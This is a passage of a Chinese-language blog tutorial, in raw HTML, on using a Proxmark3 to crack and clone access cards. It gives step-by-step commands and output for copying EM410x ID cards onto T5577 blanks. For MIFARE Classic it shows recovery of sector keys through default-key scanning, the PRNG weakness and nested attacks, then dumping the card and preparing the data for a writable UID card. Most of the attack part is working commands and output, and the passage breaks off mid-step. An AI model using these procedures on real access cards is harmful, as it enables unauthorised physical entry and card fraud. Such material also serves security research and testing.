target=\"_blank\" rel=\"noopener\">传送门</a><br>安装驱动文件前需要禁用<strong>驱动安装强制签名</strong>，方法–&gt;<a href=\"https://jingyan.baidu.com/article/624e74594dbc8d34e8ba5aa6.html\" target=\"_blank\" rel=\"noopener\">传送门</a><br>驱动安装方法<br><strong>我的电脑右键–&gt;管理–&gt;设备管理器–&gt;端口下的设备右键–&gt;更新驱动程序–&gt;浏览我的计算机–&gt;选择本地–&gt;从磁盘安装–找到官方的驱动文件–&gt;确认</strong><br>驱动安装完成会显示图片上的样子，记住<strong>COM端口</strong><br><img src=\"/img/2018-07-26/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"></p>\n<h6 id=\"硬件使用方法\"><a href=\"#硬件使用方法\" class=\"headerlink\" title=\"硬件使用方法\"></a>硬件使用方法</h6><p><strong>Proxmark3 Easy</strong><br><img src=\"/img/2018-07-26/3.jpg\" srcset=\"/img/static/loading.gif\" alt=\"3\"></p>\n<pre><code>1 功能按钮\n2 ABCD工作状态指示灯\n3 USB接口\n4 电源指示灯\n5 低频读卡区\n6 高频读卡区\n</code></pre><p>&emsp;&emsp;功能按钮有<code>退出</code>、<code>取消</code>、<code>停止</code>、<code>强刷固件</code>的功能，ABCD指示灯作为设备运行的依据，闪烁说明正在进行，完全熄灭或者常亮代表攻击失败、等待。全部熄灭表示已经停止运行了，直接重新拔插设备。</p>\n<h6 id=\"破解方法\"><a href=\"#破解方法\" class=\"headerlink\" title=\"破解方法\"></a>破解方法</h6><p><strong>读卡片ID号→换上T5577卡→把ID号写入卡片→完成</strong><br>ID是没有密码只有卡号的，因此只要知道卡号就可以复制。<br>软件资料包–&gt;<a href=\"https://pan.baidu.com/s/1feD3GKEaLw8jVTOGs5N40w\" target=\"_blank\" rel=\"noopener\">密码: f8q4</a><br>打开<code>官方软件固件\\pm3-bin-2.5.0\\win32(client+GUI)\\Proxmark Tool.exe</code>，箭头所指选择刚刚驱动安装的那个<code>COM端口</code>，连接Proxmark3，接入电脑后，电源指示灯处<code>POW</code>亮蓝灯，<code>FULL</code>亮绿灯，<code>CHR</code>闪烁微弱红灯。<br><img src=\"/img/2018-07-26/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>在<code>COMMAND TO SEND</code>里输入<code>hw tune</code>测试天线谐振电压，高频超过5V，低频超过10V就可以正常使用。<br><pre><code class=\"hljs undefined\"><span class=\"hljs-meta\">proxmark3&gt;</span><span class=\"bash\"> hw tune</span>\nMeasuring antenna characteristics, please wait........          \n<span class=\"hljs-meta\">#</span><span class=\"bash\"> LF antenna: 22.27 V @   125.00 kHz          </span>\n<span class=\"hljs-meta\">#</span><span class=\"bash\"> LF antenna: 31.76 V @   134.00 kHz          </span>\n<span class=\"hljs-meta\">#</span><span class=\"bash\"> LF optimal: 31.76 V @   133.33 kHz          </span>\n<span class=\"hljs-meta\">#</span><span class=\"bash\"> HF antenna: 20.17 V @    13.56 MHz          </span>\nDisplaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.</code></pre></p>\n<p>把低频ID卡（门禁卡）放到低频读卡区输入<code>lf search</code>获取ID卡的信息，把卡号抄下来，复制时要用<br><pre><code class=\"hljs undefined\">proxmark3&gt; lf search\nReading <span class=\"hljs-number\">30000</span> bytes from device memory\nData fetched          \nSamples @ <span class=\"hljs-number\">8</span> bits/smpl, decimation <span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>           \nNOTE: <span class=\"hljs-keyword\">some</span> demods output possible binary\n  <span class=\"hljs-keyword\">if</span> it finds something that looks like a tag          \n<span class=\"hljs-literal\">False</span> Positives ARE possible\nChecking <span class=\"hljs-keyword\">for</span> known tags:\nEM410x pattern found:           \nEM TAG ID      : 0000001450         //<span class=\"hljs-type\">ID</span>卡号，这个抄下来，如果是HID卡会显示HID\nUnique TAG ID  : 000000280<span class=\"hljs-type\">A</span>          \nPossible de-scramble patterns          \nHoneyWell IdentKey &#123;          \nDEZ <span class=\"hljs-number\">8</span>          : 00005200          \nDEZ <span class=\"hljs-number\">10</span>         : 0000005200          \nDEZ <span class=\"hljs-number\">5.5</span>        : 00000.05200          \nDEZ <span class=\"hljs-number\">3.5</span>A       : 000.05200          \nDEZ <span class=\"hljs-number\">3.5</span>B       : 000.05200          \nDEZ <span class=\"hljs-number\">3.5</span>C       : 000.05200          \nDEZ <span class=\"hljs-number\">14</span>/IK2     : 00000000005200          \nDEZ <span class=\"hljs-number\">15</span>/IK3     : 000000000010250          \nDEZ <span class=\"hljs-number\">20</span>/ZK      : 00000000000002080010          \n&#125;\nOther          : 05200_000_00005200          \nPattern Paxton : 1331792 [0<span class=\"hljs-type\">x145250</span>]          \nPattern <span class=\"hljs-number\">1</span>      : 16652 [0<span class=\"hljs-type\">x410C</span>]          \nPattern Sebury : 5200 0 5200  [0<span class=\"hljs-type\">x1450</span> <span class=\"hljs-number\">0</span>x0 <span class=\"hljs-number\">0</span>x1450]          \nValid EM410x ID Found! \t\t\t//卡的类型</code></pre></p>\n<p>把T5577卡放到低频读卡区，输入命令<code>lf hid clone 0000001450</code><br><pre><code class=\"hljs undefined\"><span class=\"hljs-meta\">proxmark3&gt;</span><span class=\"bash\"> lf hid <span class=\"hljs-built_in\">clone</span> 0000001450 </span>\nCloning tag with ID 000001450          \n<span class=\"hljs-meta\">proxmark3&gt;</span><span class=\"bash\"> </span>\n<span class=\"hljs-meta\">proxmark3&gt;</span><span class=\"bash\"> <span class=\"hljs-comment\">#db# DONE!</span></span></code></pre></p>\n<p>上述命令在左上方的命令树中都可以找到，左边有一些按钮和命令的介绍<br><img src=\"/img/2018-07-26/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"><br>ID卡复制就完成了<br>效果如下<br><img src=\"/img/2018-07-26/11.jpg\" srcset=\"/img/static/loading.gif\" alt=\"11\"></p>\n<h5 id=\"破解IC卡\"><a href=\"#破解IC卡\" class=\"headerlink\" title=\"破解IC卡\"></a>破解IC卡</h5><h6 id=\"IC卡破解思路\"><a href=\"#IC卡破解思路\" class=\"headerlink\" title=\"IC卡破解思路\"></a>IC卡破解思路</h6><p><strong>获取任意扇区的密钥</strong></p>\n<ul>\n<li><strong>PRNG 漏洞攻击得 0 扇区密匙</strong></li>\n<li><strong>默认密码扫描获得密匙</strong></li>\n<li><strong>嗅探读卡机和卡片交互数据获得密匙</strong></li>\n<li><strong>模拟成 M1 卡刷卡后捕获密匙（挑读卡机，兼容性不好）</strong></li>\n</ul>\n<p>↓<br><strong>利用MFOC漏洞用已知扇区密钥求所有扇区密钥</strong><br>↓<br><strong>用破解出的密匙把卡片数据读出导入电脑</strong><br>↓<br><strong>把电脑中的数据写入UID卡中</strong><br>&emsp;&emsp;第一步是最重要也是最难的一步，很多IC卡往往都是难以攻破0扇区的密钥而无法进行下一步。默认密码扫描看运气，PRNG漏洞攻击概率低，后面两个虽然概率高但是成本高且实施比较困难。<br>&emsp;&emsp;上面的<code>Proxmark Tool</code>是官方英文版GUI，还有国内中文版GUI（Proxmark3_EASY_GUI），中文版的GUI比较简单，不用记很多命令，原生态<code>PM3指令台</code>就是纯命令行模式，看起来也比较有逼格点。一开始我是根据资料用英文版的GUI，感觉不怎么好用，后来用了原生态后觉得原生态的好用多了，但是要记命令，命令忘记了就用中文GUI查命令ㄟ( ▔, ▔ )ㄏ。<code>can&#39;t slect card</code>这个bug也是在用了原生态之后才知道的。<br><strong>PRNG漏洞获取0扇区密钥，486固件不掉线外，630之后的固件，有些卡可以破，有卡些会掉线并出现can’t slect card</strong><br><img src=\"/img/2018-07-26/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"></p>\n<h6 id=\"获取0扇区密钥\"><a href=\"#获取0扇区密钥\" class=\"headerlink\" title=\"获取0扇区密钥\"></a>获取0扇区密钥</h6><p>扯远了，默认密码扫描<code>hf mf chk *1 ? t</code><br><pre><code class=\"hljs undefined\">proxmark3&gt; hf mf chk <span class=\"hljs-number\">*1</span> ? t\n<span class=\"hljs-literal\">No</span> key specified, trying<span class=\"hljs-built_in\"> default </span>keys\nchk<span class=\"hljs-built_in\"> default </span>key[ 0] ffffffffffff\nchk<span class=\"hljs-built_in\"> default </span>key[ 1] 000000000000\nchk<span class=\"hljs-built_in\"> default </span>key[ 2] a0a1a2a3a4a5\nchk<span class=\"hljs-built_in\"> default </span>key[ 3] b0b1b2b3b4b5\nchk<span class=\"hljs-built_in\"> default </span>key[ 4] aabbccddeeff\nchk<span class=\"hljs-built_in\"> default </span>key[ 5] 4d3a99c351dd\nchk<span class=\"hljs-built_in\"> default </span>key[ 6] 1a982c7e459a\nchk<span class=\"hljs-built_in\"> default </span>key[ 7] d3f7d3f7d3f7\nchk<span class=\"hljs-built_in\"> default </span>key[ 8] 714c5c886e97\nchk<span class=\"hljs-built_in\"> default </span>key[ 9] 587ee5f9350f\nchk<span class=\"hljs-built_in\"> default </span>key[10] a0478cc39091\nchk<span class=\"hljs-built_in\"> default </span>key[11] 533cb6c723f6\nchk<span class=\"hljs-built_in\"> default </span>key[12] 8fd0a4f256e9\n--sector: 0, block:  3, key type:A, key count:13\n\t\t.\n\t\t.\n\t\t.\n--sector:15, block: 63, key type:B, key count:13\nFound valid key:[ffffffffffff]\nFound keys have been transferred <span class=\"hljs-keyword\">to</span> the emulator memory</code></pre></p>\n<p>密码是默认密码的时候可以扫的出来，不是默认密码可以尝试PRNG漏洞获取0扇区密钥<code>hf mf mifare</code><br><pre><code class=\"hljs undefined\">proxmark3&gt;hf mf mifare\n\t\t.\n\t\t.\n\t\t.\nuid(ea117dee) nt(431c39b0) par(0000000000000000) ks(030702000a030209) nr(800000005)\n\n\n|<span class=\"hljs-string\">diff</span>|<span class=\"hljs-string\">&#123;nr&#125;    </span>|<span class=\"hljs-string\">ks3</span>|<span class=\"hljs-string\">ks3^5</span>|<span class=\"hljs-string\">parity         </span>|\n+----+--------+---+-----+---------------+\n|<span class=\"hljs-string\"> 00 </span>|<span class=\"hljs-string\">00000005</span>|<span class=\"hljs-string\"> 3 </span>|<span class=\"hljs-string\">  6  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\n|<span class=\"hljs-string\"> 20 </span>|<span class=\"hljs-string\">00000025</span>|<span class=\"hljs-string\"> 7 </span>|<span class=\"hljs-string\">  2  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\n|<span class=\"hljs-string\"> 40 </span>|<span class=\"hljs-string\">00000045</span>|<span class=\"hljs-string\"> 2 </span>|<span class=\"hljs-string\">  7  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\n|<span class=\"hljs-string\"> 60 </span>|<span class=\"hljs-string\">00000065</span>|<span class=\"hljs-string\"> 0 </span>|<span class=\"hljs-string\">  5  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\n|<span class=\"hljs-string\"> 80 </span>|<span class=\"hljs-string\">00000085</span>|<span class=\"hljs-string\"> a </span>|<span class=\"hljs-string\">  f  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\n|<span class=\"hljs-string\"> a0 </span>|<span class=\"hljs-string\">000000a5</span>|<span class=\"hljs-string\"> 3 </span>|<span class=\"hljs-string\">  6  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\n|<span class=\"hljs-string\"> c0 </span>|<span class=\"hljs-string\">000000c5</span>|<span class=\"hljs-string\"> 2 </span>|<span class=\"hljs-string\">  7  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\n|<span class=\"hljs-string\"> e0 </span>|<span class=\"hljs-string\">000000e5</span>|<span class=\"hljs-string\"> 9 </span>|<span class=\"hljs-string\">  c  </span>|<span class=\"hljs-string\">0,0,0,0,0,0,0,0</span>|\nparity is all zero,try special attack!just wait for few more seconds...         \np1:0 p2:0 p3:0 key:ffffffffffff\np1:58b87 p2:61ec p3:1 key:b4c98bd73e94\np1:c6a1b p2:d983 p3:2 key:576efc88ccc7\np1:ef844 p2:106dd p3:3 key:34ed3c6092e9\np1:f7e1e p2:10fd7 p3:4 key:2de06659d60e\np1:1239c0 p2:13fa0 p3:5 key:08b7558601a1\np1:12d1b3 p2:149c9 p3:6 key:00adbba1e330\nkey_count:7\n------------------------------------------------------------------\nKey found:ffffffffffff\n\nFound valid key:ffffffffffff</code></pre></p>\n<p>因为设备是<del>我</del>小姐姐的，固件是630之后的，所以会出现很多<code>#db# Mifare: Can&#39;t select card</code>,就放不了全部代码，查看固件命令<code>hw version</code><br><pre><code class=\"hljs undefined\"><span class=\"hljs-selector-tag\">proxmark3</span>&gt; <span class=\"hljs-selector-tag\">hw</span> <span class=\"hljs-selector-tag\">version</span>\n<span class=\"hljs-selector-id\">#db</span># <span class=\"hljs-selector-tag\">Prox</span>/<span class=\"hljs-selector-tag\">RFID</span> <span class=\"hljs-selector-tag\">mark3</span> <span class=\"hljs-selector-tag\">RFID</span> <span class=\"hljs-selector-tag\">instrument</span>\n<span class=\"hljs-selector-id\">#db</span># <span class=\"hljs-selector-tag\">bootrom</span>: /<span class=\"hljs-selector-tag\">-suspect</span> <span class=\"hljs-selector-tag\">2016-11-09</span> <span class=\"hljs-selector-tag\">00</span><span class=\"hljs-selector-pseudo\">:59</span><span class=\"hljs-selector-pseudo\">:56</span>\n<span class=\"hljs-selector-id\">#db</span># <span class=\"hljs-selector-tag\">os</span>: /<span class=\"hljs-selector-tag\">-suspect</span> <span class=\"hljs-selector-tag\">2016-12-08</span> <span class=\"hljs-selector-tag\">12</span><span class=\"hljs-selector-pseudo\">:45</span><span class=\"hljs-selector-pseudo\">:38</span>\n<span class=\"hljs-selector-id\">#db</span># <span class=\"hljs-selector-tag\">HF</span> <span class=\"hljs-selector-tag\">FPGA</span> <span class=\"hljs-selector-tag\">image</span> <span class=\"hljs-selector-tag\">built</span> <span class=\"hljs-selector-tag\">on</span> <span class=\"hljs-selector-tag\">2015</span>/<span class=\"hljs-selector-tag\">03</span>/<span class=\"hljs-selector-tag\">09</span> <span class=\"hljs-selector-tag\">at</span> <span class=\"hljs-selector-tag\">08</span><span class=\"hljs-selector-pseudo\">:41</span><span class=\"hljs-selector-pseudo\">:42</span>\n<span class=\"hljs-selector-id\">#db</span>#   <span class=\"hljs-selector-tag\">Modify</span> <span class=\"hljs-selector-tag\">by</span> <span class=\"hljs-selector-tag\">Willok</span>(willok<span class=\"hljs-variable\">@163</span>.com)\n\n<span class=\"hljs-selector-id\">#db</span>#      <span class=\"hljs-selector-tag\">proxmark3</span><span class=\"hljs-selector-class\">.taobao</span><span class=\"hljs-selector-class\">.com</span>\n\n\n<span class=\"hljs-selector-tag\">uC</span>: <span class=\"hljs-selector-tag\">AT91SAM7S256</span> <span class=\"hljs-selector-tag\">Rev</span> <span class=\"hljs-selector-tag\">B</span>\n<span class=\"hljs-selector-tag\">Embedded</span> <span class=\"hljs-selector-tag\">Processor</span>: <span class=\"hljs-selector-tag\">ARM7TDMI</span>\n<span class=\"hljs-selector-tag\">Nonvolatile</span> <span class=\"hljs-selector-tag\">Program</span> <span class=\"hljs-selector-tag\">Memory</span> <span class=\"hljs-selector-tag\">Size</span>: <span class=\"hljs-selector-tag\">256K</span> <span class=\"hljs-selector-tag\">bytes</span>\n<span class=\"hljs-selector-tag\">Second</span> <span class=\"hljs-selector-tag\">Nonvolatile</span> <span class=\"hljs-selector-tag\">Program</span> <span class=\"hljs-selector-tag\">Memory</span> <span class=\"hljs-selector-tag\">Size</span>: <span class=\"hljs-selector-tag\">None</span>\n<span class=\"hljs-selector-tag\">Internal</span> <span class=\"hljs-selector-tag\">SRAM</span> <span class=\"hljs-selector-tag\">Size</span>: <span class=\"hljs-selector-tag\">64K</span> <span class=\"hljs-selector-tag\">bytes</span>\n<span class=\"hljs-selector-tag\">Architecture</span> <span class=\"hljs-selector-tag\">Identifier</span>: <span class=\"hljs-selector-tag\">AT91SAM7Sxx</span> <span class=\"hljs-selector-tag\">Series</span>\n<span class=\"hljs-selector-tag\">Nonvolatile</span> <span class=\"hljs-selector-tag\">Program</span> <span class=\"hljs-selector-tag\">Memory</span> <span class=\"hljs-selector-tag\">Type</span>: <span class=\"hljs-selector-tag\">Embedded</span> <span class=\"hljs-selector-tag\">Flash</span> <span class=\"hljs-selector-tag\">Memory</span></code></pre></p>\n<p><strong>Tip:固件版本是根据固件的日期来看的</strong><br>我们可以测试一下我们拿到的密钥对不对，错误不会返回最下面那一行<br><pre><code class=\"hljs undefined\">proxmark3&gt; hf mf chk <span class=\"hljs-number\">0</span> A ffffffffffff\nchk <span class=\"hljs-built_in\">key</span>[ <span class=\"hljs-number\">0</span>] ffffffffffff\n--sector: <span class=\"hljs-number\">0</span>, block:  <span class=\"hljs-number\">0</span>, <span class=\"hljs-built_in\">key</span> <span class=\"hljs-built_in\">type</span>:A, <span class=\"hljs-built_in\">key</span> <span class=\"hljs-built_in\">count</span>: <span class=\"hljs-number\">1</span>\nFound valid <span class=\"hljs-built_in\">key</span>:[ffffffffffff]</code></pre></p>\n<h6 id=\"知一求十五\"><a href=\"#知一求十五\" class=\"headerlink\" title=\"知一求十五\"></a>知一求十五</h6><p>获取到0扇区的密钥后我们就可以通过MFOC漏洞获取所有扇区的密钥（100%成功）<br><pre><code class=\"hljs undefined\">proxmark3&gt; hf mf nested 1 0 A ffffffffffff \t\t\t//0是0扇区，A密钥\nTesting known keys. Sector count=16\nnested...\nTime in nested: 4.330 (inf sec per key)\n\n-----------------------------------------------\nIterations count: 0\n\n\n|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|\n|<span class=\"hljs-string\">sec</span>|<span class=\"hljs-string\">key A           </span>|<span class=\"hljs-string\">res</span>|<span class=\"hljs-string\">key B           </span>|<span class=\"hljs-string\">res</span>|\n|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|\n|<span class=\"hljs-string\">000</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">001</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">002</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">003</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">004</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">005</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">006</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">007</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">008</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">009</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">010</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">011</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">012</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">013</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">014</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">015</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|</code></pre></p>\n<p>接下来导出密钥<br><pre><code class=\"hljs undefined\">proxmark3&gt; hf mf nested 1 0 A ffffffffffff d\nTesting known keys. Sector count=16\nnested...\nTime in nested: 4.302 (inf sec per key)\n\n-----------------------------------------------\nIterations count: 0\n\n\n|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|\n|<span class=\"hljs-string\">sec</span>|<span class=\"hljs-string\">key A           </span>|<span class=\"hljs-string\">res</span>|<span class=\"hljs-string\">key B           </span>|<span class=\"hljs-string\">res</span>|\n|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|\n|<span class=\"hljs-string\">000</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">001</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">002</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">003</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">004</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">005</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">006</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">007</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">008</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">009</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">010</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">011</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">012</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">013</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">014</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">015</span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|<span class=\"hljs-string\">  ffffffffffff  </span>|<span class=\"hljs-string\"> 1 </span>|\n|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|<span class=\"hljs-string\">----------------</span>|<span class=\"hljs-string\">---</span>|\nPrinting keys to binary file dumpkeys.bin...</code></pre></p>\n<p>导出后会在根目录生成一个dumpkeys.bin的文件，里面存放了16个扇区的密钥（16进制）<br><img src=\"/img/2018-07-26/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"></p>\n<h6 id=\"导出数据\"><a href=\"#导出数据\" class=\"headerlink\" title=\"导出数据\"></a>导出数据</h6><p>拿到密码后我们就可以导出卡上的数据到电脑里<br><pre><code class=\"hljs undefined\">proxmark3&gt; hf mf dump\n|-----------------------------------------|\n|------ Reading sector access bits...-----|\n|-----------------------------------------|\n#db# <span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">BLOCK</span> FINISHED\n#db# <span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">BLOCK</span> FINISHED\n\t  .\n\t  .\n\t  .\n#db# <span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">BLOCK</span> FINISHED\n#db# <span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">BLOCK</span> FINISHED\n|-----------------------------------------|\n|----- Dumping all blocks <span class=\"hljs-keyword\">to</span> file... -----|\n|-----------------------------------------|\n#db# <span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">BLOCK</span> FINISHED\nSuccessfully <span class=\"hljs-keyword\">read</span> <span class=\"hljs-keyword\">block</span>  <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">of</span> sector  <span class=\"hljs-number\">0</span>.\n#db# <span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">BLOCK</span> FINISHED\nSuccessfully <span class=\"hljs-keyword\">read</span> <span class=\"hljs-keyword\">block</span>  <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">of</span> sector  <span class=\"hljs-number\">0</span>.\n\t  .\n\t  .\n\t  .\n#db# <span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">BLOCK</span> FINISHED\nSuccessfully <span class=\"hljs-keyword\">read</span> <span class=\"hljs-keyword\">block</span>  <span class=\"hljs-number\">3</span> <span class=\"hljs-keyword\">of</span> sector <span class=\"hljs-number\">15</span>.\nDumped <span class=\"hljs-number\">64</span> blocks (<span class=\"hljs-number\">1024</span> bytes) <span class=\"hljs-keyword\">to</span> file dumpdata.bin</code></pre></p>\n<p>同样16进制打开<br><img src=\"/img/2018-07-26/9.png\" srcset=\"/img/static/loading.gif\" alt=\"9\"><br>因为是测试卡，所以里面就没什么数据ㄟ( ▔, ▔ )ㄏ。</p>\n<h6 id=\"写入UID卡\"><a href=\"#写入UID卡\" class=\"headerlink\" title=\"写入UID卡\"></a>写入UID卡</h6><p>下一步把数据写进写UID卡<br>Proxmark3不能识别、使用bin文件，需要转换成eml格式<br>第一个方法是运行下面的命令转成eml格式<br><pre><code class=\"hljs undefined\">proxmark3&gt; script run dumptoemul<span class=\"hljs-selector-class\">.lua</span>\n--- Executing: ./scripts/dumptoemul<span class=\"hljs-selector-class\">.lua</span>, args<span class=\"hljs-string\">''</span>\nWrote an emulator-dump to the file EA117DEE<span 